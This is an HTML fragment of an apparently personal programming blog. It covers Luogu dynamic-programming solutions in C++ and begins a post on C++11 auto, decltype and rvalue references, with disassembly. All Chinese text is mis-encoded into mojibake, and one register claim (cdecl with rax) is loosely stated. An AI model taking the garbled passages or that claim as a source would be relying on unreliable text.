class="number">0</span><span class="comment">//è¿™ä¸ªç‚®å…µçš„æ‘†æ”¾çŠ¶æ€è¦æ»¡è¶³åœ°å½¢è¦æ±‚</span></span><br><span class="line">            )&#123;</span><br><span class="line">                row_legal_states[row].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;row_state&lt;&lt;endl;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    row_legal_states[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//ä¸€å®šè¦è¿™ä¸ªåˆå§‹åŒ–,ç¬¬äºŒè¡Œä¼šæŸ¥ç¬¬0è¡Œçš„åˆæ³•çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[<span class="number">1</span>])&#123;<span class="comment">//ç¬¬ä¸€è¡Œéœ€è¦ç‰¹æ®Šå¤„ç†,å› ä¸ºç¬¬ä¸€è¡Œå¾€å‰çœ‹ä¸¤è¡Œä¸å­˜åœ¨ç¬¬-1è¡Œ,ä¸èƒ½ä½œä¸ºæ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">        dp[<span class="number">1</span>][current_state][<span class="number">0</span>]=cnt_cannons_in_state[current_state];</span><br><span class="line">        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[<span class="number">1</span>][current_state][<span class="number">0</span>]);<span class="comment">//ä¸€å®šä¸è¦å¿˜è®°ç»Ÿè®¡åªæœ‰ä¸€è¡Œæ—¶çš„æœ€å¤§ç‚®å…µæ•°é‡,æµ‹è¯•ç‚¹11ä¸“é—¨å¡è¿™ä¸ª</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">2</span>;current_row&lt;=n;++current_row)&#123;<span class="comment">//ç¬¬äºŒè¡Œå¾€å‰çœ‹ä¸¤è¡Œæ­£å¥½æ˜¯ç¬¬0è¡Œ,ä¸‹æ ‡è®¿é—®æ­£å¸¸</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;<span class="comment">//ä¸Šä¸€è¡Œè¡Œå·</span></span><br><span class="line">        <span class="keyword">auto</span> preprevious_row=previous_row<span class="number">-1</span>;<span class="comment">//ä¸Šä¸¤è¡Œè¡Œå·</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[current_row])&#123;<span class="comment">//æšä¸¾å½“å‰è¡Œåˆæ³•çŠ¶æ€</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:row_legal_states[previous_row])&#123;<span class="comment">//æšä¸¾ä¸Šä¸€è¡Œåˆæ³•çŠ¶æ€</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> preprevious_state:row_legal_states[preprevious_row])&#123;<span class="comment">//æšä¸¾ä¸Šä¸¤è¡Œåˆæ³•çŠ¶æ€</span></span><br><span class="line">                    <span class="keyword">if</span>(</span><br><span class="line">                        (previous_state &amp; preprevious_state)==<span class="number">0</span><span class="comment">//å‰ä¸¤è¡Œçš„ç‚®å…µä¸èƒ½æ‰“æ¶</span></span><br><span class="line">                        &amp;&amp;</span><br><span class="line">                        (current_state&amp;(previous_state|preprevious_state))==<span class="number">0</span><span class="comment">//æœ¬è¡Œå’Œå‰ä¸¤è¡Œçš„ç‚®å…µä¸èƒ½æ‰“æ¶</span></span><br><span class="line">                    )&#123;</span><br><span class="line">                        dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(<span class="comment">//çŠ¶æ€è½¬ç§»æ–¹ç¨‹</span></span><br><span class="line">                            dp[current_row][current_state][previous_state],</span><br><span class="line">                            dp[previous_row][previous_state][preprevious_state]+cnt_cannons_in_state[current_state]</span><br><span class="line">                        );</span><br><span class="line">                        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[current_row][current_state][previous_state]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for(auto current_state:row_legal_states[n])&#123;</span></span><br><span class="line">    <span class="comment">//     cnt_max_cannons=max(cnt_max_cannons,dp[n])</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    cout&lt;&lt;cnt_max_cannons&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p2051-å…«ä¸­è±¡ç‚®"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2051">P2051 å…«ä¸­è±¡ç‚®</a></h2>
<p>åœ¨ä¸€ä¸ª<span class="math inline">\(n\times
m\)</span>çš„æ£‹ç›˜ä¸Š,ä»»æ„æ”¾ä¸­è±¡çš„ç‚®,è¦æ±‚ä»»æ„ä¸¤ä¸ªç‚®ä¸èƒ½ç›¸äº’æ”»å‡»,éšä¾¿æ”¾ç‚®,é—®æœ€å¤šæœ‰å¤šå°‘ç§æ”¾æ³•</p>
<p>å•¥æ—¶å€™èƒ½ç‚®æ‰“ç‚®?ä¸€æ¡æ°´å¹³æˆ–è€…ç«–ç›´çº¿ä¸Šæœ‰ä»¨ä¸ªä»¥ä¸Šçš„ç‚®å°±è¦æ‰“ç‚®äº†</p>
<p>å› æ­¤å°±é—®é¢˜è½¬åŒ–ä¸º,<span class="math inline">\(n\times
m\)</span>ä¸ªæ–¹æ ¼,æ¯è¡Œæ¯åˆ—å¯ä»¥æœ‰0æˆ–è€…1æˆ–è€…2ä¸ªçŸ³å¤´,æ±‚æœ‰å¤šå°‘ç§æ‘†æ”¾æ–¹æ³•</p>
<h3 id="çŠ¶æ€å‹ç¼©-4">çŠ¶æ€å‹ç¼©</h3>
<p>æˆ‘æœ€åˆçš„æƒ³æ³•æ˜¯,æ¯è¡Œ,æ¯åˆ—éƒ½è®°å½•å·²ç»æ”¾è¿‡å‡ ä¸ªçŸ³å¤´,ç„¶åç›´æ¥æ·±æœ</p>
<p>dfs(x,y)æ˜¯å½“å‰è¦åœ¨ç¬¬xè¡Œç¬¬yåˆ—æ”¾çŸ³å¤´,é¦–å…ˆåˆ¤æ–­èƒ½å¦æ”¾çŸ³å¤´,å¦‚æœèƒ½åˆ™å°è¯•æ”¾ä¸ŠçŸ³å¤´ç„¶åä¸‹ä¸€æ­¥æ·±æœ.</p>
<p>ä¸ç®¡èƒ½ä¸èƒ½æ”¾çŸ³å¤´,éƒ½è¦æœ‰ä¸€ä¸ªç›´æ¥ä¸‹ä¸€æ­¥æ·±æœ</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">9999973</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> cnt_on_col[maxn];</span><br><span class="line"><span class="type">int</span> cnt_on_row[maxn];</span><br><span class="line"><span class="type">int</span> cnt_result=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(<span class="type">int</span> y,<span class="type">int</span> x)</span></span>&#123;<span class="comment">//ç¬¬yè¡Œ,ç¬¬xåˆ—</span></span><br><span class="line">    <span class="keyword">if</span>(y&lt;=n&amp;&amp;x&gt;m)&#123;</span><br><span class="line">        <span class="built_in">DFS</span>(y<span class="number">+1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y&gt;n)&#123;</span><br><span class="line">        cnt_result=(cnt_result<span class="number">+1</span>)%mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt_on_col[x]&lt;<span class="number">2</span>&amp;&amp;cnt_on_row[y]&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        ++cnt_on_col[x];</span><br><span class="line">        ++cnt_on_row[y];</span><br><span class="line">        <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line">        --cnt_on_col[x];</span><br><span class="line">        --cnt_on_row[y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">DFS</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœå°±ä¸‰ä¸ªæµ‹è¯•ç‚¹è¿‡äº†,å…¶ä»–å…¨éƒ½TLE</p>
<p>ç‹—å±çŠ¶å‹,<code>dp[i][j][k]</code>è¡¨ç¤ºå‰iè¡Œä¸­çš„åˆ—,æœ‰ä¸€ä¸ªç‚®çš„åˆ—æœ‰jä¸ª,æœ‰ä¸¤ä¸ªç‚®çš„åˆ—æœ‰kä¸ª</p>
<p>å®Œäº‹</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/21/C++11%E7%89%B9%E6%80%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/21/C++11%E7%89%B9%E6%80%A7/" class="post-title-link" itemprop="url">C++11ç‰¹æ€§</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-21 22:48:00 / Modified: 22:48:58" itemprop="dateCreated datePublished" datetime="2022-12-21T22:48:00+08:00">2022-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c11ç‰¹æ€§">C++11ç‰¹æ€§</h1>
<p>è¿ˆå‘ç°ä»£çš„ç¬¬ä¸€æ­¥</p>
<p>2011å¹´çš„C++æ ‡å‡†,å«c++11</p>
<p>ä½¿ç”¨gccç¼–è¯‘æ—¶,åŠ å…¥ç¼–è¯‘é€‰é¡¹-std=c++11å³å¯ä½¿ç”¨c++11ç‰¹æ€§</p>
<h2 id="ç±»å‹æ¨å¯¼">ç±»å‹æ¨å¯¼</h2>
<p>auto&amp;decltype</p>
<h3 id="auto">auto</h3>
<p><code>auto å·¦å€¼=å³å€¼;</code></p>
<p>é€šè¿‡å³å€¼çš„ç±»å‹æ¨æ–­autoä»£è¡¨çš„å·¦å€¼ç±»å‹,å¿…é¡»å¾—æœ‰å³å€¼æ‰èƒ½ç”¨autoå®šä¹‰å·¦å€¼</p>
<p>ä¸€èˆ¬ç”¨äºå¾ªç¯æ—¶ä½œä¸ºè¿­ä»£å™¨,æ¯”å¦‚åœ¨è§£é‡Šå™¨éå†ç¬¦å·è¡¨æ—¶</p>
<p>åœ¨lexer.hppä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªå†…ç½®ç¬¦å·è¡¨</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.hpp</span></span><br><span class="line"><span class="type">static</span> std::vector&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>åœ¨lexer.cppä¸­æœ‰ä¸€ä¸ªqueryTokenTableå‡½æ•°,æ ¹æ®å‚æ•°å­—ç¬¦ä¸²æŸ¥æ‰¾å†…ç½®ç¬¦å·è¡¨,å¦‚æœæ‰¾åˆ°ç›¸åº”ç¬¦å·è¿”å›<strong>å…¶å¼•ç”¨</strong></p>
<p>ä¼ ç»Ÿçš„æ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ªå¾ªç¯å˜é‡i,éå†æ•´ä¸ªç¬¦å·è¡¨</p>
<p>å¦‚æœä½¿ç”¨autoåˆ™æ›´åŠ æ–¹ä¾¿,foreachå¾ªç¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.cpp</span></span><br><span class="line"><span class="type">static</span> Token* <span class="title function_">queryTokenTable</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> &amp;lexme)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;build_in_table_token:build_in_token_table)&#123;<span class="comment">//æ­¤å¤„ä¸€å®šæ˜¯auto &amp;,æ˜¯ä¸ªå¼•ç”¨ç±»å‹,å¦åˆ™ä¼šæ‹·è´æ„é€ æ–°å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span>(build_in_table_token.getLexme()==lexme)&#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;build_in_table_token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯auto
&amp;,è€Œä¸æ˜¯auto,ä¹‹å‰æˆ‘è®¤ä¸ºautoæ—¢ç„¶æ˜¯è‡ªåŠ¨çš„,åº”è¯¥å¯ä»¥æ¨å¯¼å‡ºå¼•ç”¨ç±»å‹.</p>
<p>ç„¶è€Œå®é™…ä¸Šä¸ä¼š,autoä¼šå¿½ç•¥å¼•ç”¨ç±»å‹è¿˜æœ‰cvå±æ€§,å› æ­¤è¿™é‡Œéœ€è¦æ‰‹å·¥åŠ ä¸Šå¼•ç”¨ç±»å‹</p>
<h3 id="decltype">decltype</h3>
<p>decltypeå…³é”®å­—æ˜¯ç”¨äºå®šä¹‰åŒç±»å‹å˜é‡,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">decltype(a) b=<span class="number">2</span>;</span><br><span class="line">decltype(a+b) c=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>decltypeå’Œautoä¸åŒçš„æ˜¯,decltypeå®Œå…¨æ‹·è´å…¶æ“ä½œæ•°çš„ç±»å‹,åŒ…æ‹¬å¼•ç”¨å’Œcvå±æ€§</p>
<p>å¯¹äº<code>decltype(expression)</code>,è¿™é‡Œexpressionå¦‚æœæ˜¯å‡½æ•°è°ƒç”¨,åˆ™decltypeä¸å‡½æ•°è¿”å›å€¼ç±»å‹ç›¸åŒ</p>
<h2 id="å³å€¼å¼•ç”¨">å³å€¼å¼•ç”¨</h2>
<h3 id="å³å€¼å¼•ç”¨-1">å³å€¼å¼•ç”¨</h3>
<p>é€šå¸¸getteræ–¹æ³•æ˜¯è¿™æ ·å®šä¹‰çš„:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">x</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">y</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶è¿”å›å€¼æ˜¯ä¸€ä¸ªå³å€¼,å½“è°ƒç”¨è¯­å¥ç»“æŸå,è¿”å›å€¼ç«‹åˆ»æ­»äº¡</p>
<p>å®é™…ä¸Šå¤§å¤šæ•°è°ƒç”¨çº¦å®š(è¿™é‡Œæ˜¯cdecl),å‡½æ•°çš„è¿”å›å€¼æ”¾åˆ°raxå¯„å­˜å™¨ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int x=point.x();</span><br></pre></td></tr></table></figure>
<p>è¯¥è¡Œæºä»£ç çš„æœ€åçš„æŒ‡ä»¤å¯èƒ½æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call point.x()</span><br><span class="line">mov [rbp+x],rax</span><br></pre></td></tr></table></figure>
<p>æ„å‘³ç€éœ€è¦åœ¨è°ƒç”¨è€…æ ˆå¸§ä¸­ç»™å·¦å€¼int
aå¼€4å­—èŠ‚ç©ºé—´,ç„¶åå°†å‡½æ•°è¿”å›å€¼(å­˜åœ¨äºraxå¯„å­˜å™¨)ä»˜ç»™ä»–</p>
<p>ä¹‹åraxçš„ä»»åŠ¡å°±å®Œæˆäº†,å¯ä»¥ç«‹åˆ»ç”¨äºå…¶ä»–è®¡ç®—,è¿™å°±æ„å‘³ç€å‡½æ•°è¿”å›å€¼è¿™ä¸ªå°†äº¡å€¼ä¸å¤å­˜åœ¨äº†</p>
<p>æ˜¾ç„¶æ ˆä¸­æ˜¯æ‰¾ä¸åˆ°è¿™ä¸ªè¿”å›å€¼çš„,ä»–åªä¼šä¸´æ—¶å­˜åœ¨äºå¯„å­˜å™¨ä¸­</p>
<p>å³å€¼å¼•ç”¨çš„ä½œç”¨æ˜¯,åœ¨è°ƒç”¨è€…æ ˆå¸§ä¸­ç»™è¿”å›å€¼å¼€è¾Ÿä¸€å—ç©ºé—´,å°†è¯¥è¿”å›å€¼æ”¾åˆ°è¿™å—ç©ºé—´ä¸­,æ­¤ååœ¨è°ƒç”¨è€…ä¸­å°±å¯ä»¥å¼•ç”¨"å³å€¼"äº†,å®é™…ä¸Šæ˜¯å¼•ç”¨çš„è¿”å›å€¼åœ¨è°ƒç”¨è€…æ ˆå¸§ä¸­çš„æ‹·è´,è¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡åç¼–è¯‘è§‚å¯Ÿ</p>
<p>æ¯”å¦‚å¦‚ä¸‹ç¨‹åº</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x=<span class="number">0</span>,<span class="type">int</span> _y=<span class="number">0</span>):__x(_x),__y(_y)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __x;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __y;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">A</span><span class="params">(<span class="number">2</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> &amp;&amp;x=A.<span class="built_in">x</span>();<span class="comment">//æ³¨æ„æ­¤å¤„çš„xæ˜¯å³å€¼å¼•ç”¨</span></span><br><span class="line">    <span class="type">int</span> y=A.<span class="built_in">y</span>();<span class="comment">//æ³¨æ„æ­¤å¤„çš„yæ˜¯æ™®é€šå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++11 main.cpp -O0 -o main </span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨ida64åç¼–è¯‘è§‚å¯Ÿä¹‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+A]	</span><br><span class="line">mov     ecx, eax	;thisæŒ‡é’ˆ</span><br><span class="line">call    __ZN5Point1xEv  ; Point::x(void)</span><br><span class="line">mov     [ebp+var_10], eax	;è¿”å›å€¼é¦–å…ˆæ‹·è´ç»™var_10</span><br><span class="line">lea     eax, [ebp+var_10]	</span><br><span class="line">mov     [ebp+x], eax		;ç„¶åæ‹·è´ç»™x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea     eax, [ebp+A]</span><br><span class="line">mov     ecx, eax	;this</span><br><span class="line">call    __ZN5Point1yEv  ; Point::y(void)</span><br><span class="line">mov     [ebp+y], eax	;è¿”å›å€¼ç›´æ¥æ‹·è´ç»™y</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸€ä¸ªæ˜æ˜¾åŒºåˆ«,</p>
<p><code>int &amp;&amp;x=A.x();</code>è¿™é‡Œè²Œä¼¼åœ¨è°ƒç”¨è€…æ ˆå¸§ä¸­äº§ç”Ÿäº†ä¸¤ä¸ªå±€éƒ¨å˜é‡,<code>var_10</code>å’Œ<code>x</code></p>
<p>ä½†æ˜¯<code>int y=A.y();</code>åªäº§ç”Ÿäº†ä¸€ä¸ªå±€éƒ¨å˜é‡<code>y</code></p>
<p>æ˜¾ç„¶xå’Œyä¸¤ä¸ªå˜é‡æ˜¯åœ°ä½ç›¸ç­‰,é—¨å½“æˆ·å¯¹çš„</p>
<p>è¿™ä¸ª<code>var_10</code>å°±æ˜¯å³å€¼çš„æ‹·è´,å…¶å­˜åœ¨çš„ç›®çš„å°±æ˜¯ä»£ç†å³å€¼,ä½¿å…¶å¯ä»¥è¿›è¡Œå–åœ°å€è¿ç®—,å®é™…ä¸Šå–å¾—åœ°å€æ˜¯<code>var_10</code>çš„åœ°å€</p>
<p>é—®é¢˜åˆæ¥äº†,è¿™æ ·çœ‹,ä½¿ç”¨å³å€¼å¼•ç”¨çš„æ—¶å€™å¤šäº§ç”Ÿäº†ä¸€ä¸ªå±€éƒ¨å˜é‡,å¹¶ä¸”éœ€è¦å››æ¡æŒ‡ä»¤,è€Œä¸ä½¿ç”¨å³å€¼å¼•ç”¨åªéœ€è¦ä¸¤æ¡æŒ‡ä»¤.é‚£ç”¨äº†ä¸ªå¯‚å¯å•Š,è¶Šç”¨è¶Šæ…¢æ˜¯å§.</p>
<p>è¿™æ˜¯å› ä¸ºè¿™é‡Œçš„è°ƒç”¨æƒ…å†µæ˜¯å¾ˆç®€å•çš„,æœ‰äº›å¤æ‚æƒ…å†µ,var_10ä¼šå‘æŒ¥é‡è¦ä½œç”¨,è¯¦è§<a
target="_blank" rel="noopener" href="https://blog.csdn.net/caojianfa969/article/details/118927852">å³å€¼å¼•ç”¨</a></p>
<h3 id="å®Œç¾è½¬å‘">å®Œç¾è½¬å‘</h3>
<p>æ²¡çœ‹æ˜ç™½</p>
<h3 id="è¿”å›å€¼ä¼˜åŒ–">è¿”å›å€¼ä¼˜åŒ–</h3>
<p>ç±»ä¼¼äºä¼ å‚æ—¶æ˜¯ç›´æ¥ä¼ é€’å¼•ç”¨è¿˜æ˜¯è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ç»™å½¢å‚èµ‹å€¼</p>
<p>è¿”å›æ—¶ä¹Ÿé¢ä¸´ç›¸ä¼¼çš„å±€é¢,æ¯”å¦‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x = <span 